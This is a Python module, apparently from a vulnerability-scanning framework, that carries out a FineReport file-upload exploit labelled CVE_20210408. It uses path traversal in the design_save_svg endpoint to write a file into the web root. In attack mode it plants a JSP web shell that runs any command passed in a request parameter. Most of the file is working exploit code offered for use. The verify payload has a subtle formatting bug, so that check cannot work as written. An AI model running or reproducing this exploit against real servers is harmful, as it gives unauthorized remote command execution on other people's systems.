from util.ExpRequest import ExpRequest,Output
from ClassCongregation import random_name
import util.globalvar as GlobalVar
"""
--FineReport--
CVE_20210408  [upload]，默认self.vuln = None
"""
class FineReport():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.flag = GlobalVar.get_value('flag')
        self.win_cmd = 'cmd /c '+ env.get('cmd', 'echo '+self.flag)
        self.linux_cmd = env.get('cmd', 'echo '+self.flag)
            
    def CVE_20210408_FineReport(self):
        appName = 'FineReport'
        pocname = 'CVE_20210408_FineReport'
        method = 'post'
        desc = 'FineReport:CVE_20210408'
        info = '[upload]'
        path = r'/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/'
        payload_verify = '{"__CONTENT__":{},"__CHARSET__":"UTF-8"}'.format(self.flag)
        payload = r'{"__CONTENT__":"<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>","__CHARSET__":"UTF-8"}'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 
            'Connection': 'close', 
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*', 
            'Content-Type': 'text/xml;charset=UTF-8', 
            'Accept-Au': '0c42b2f264071be0507acea1876c74'
        }
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        name = random_name(6)+'.jsp'
        path += name
        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.post(self.url + path, data=payload_verify, headers=headers)
                request = exprequest.get(self.url + '/WebReport/' + name, headers=headers)
                if self.flag in request.text:
                    return output.echo_success(method, info)
                else:
                    return output.fail()
            #_attack
            else:
                request = exprequest.post(self.url + path, data=payload, headers=headers)
                print(self.url + path)
        except Exception as error:
            return output.error_output(str(error))

def check(**kwargs):
    thread_list = []
    ExpFineReport = FineReport(**kwargs)
    #调用单个函数
    if kwargs['pocname'] != 'ALL':
        thread_list.append(kwargs['pool'].submit(getattr(ExpFineReport, kwargs['pocname'])))
    #调用所有函数
    else:
        for func in dir(FineReport):
            if not func.startswith("__"):
                thread_list.append(kwargs['pool'].submit(getattr(ExpFineReport, func)))
    #保存全局子线程列表
    GlobalVar.add_value('thread_list', thread_list)


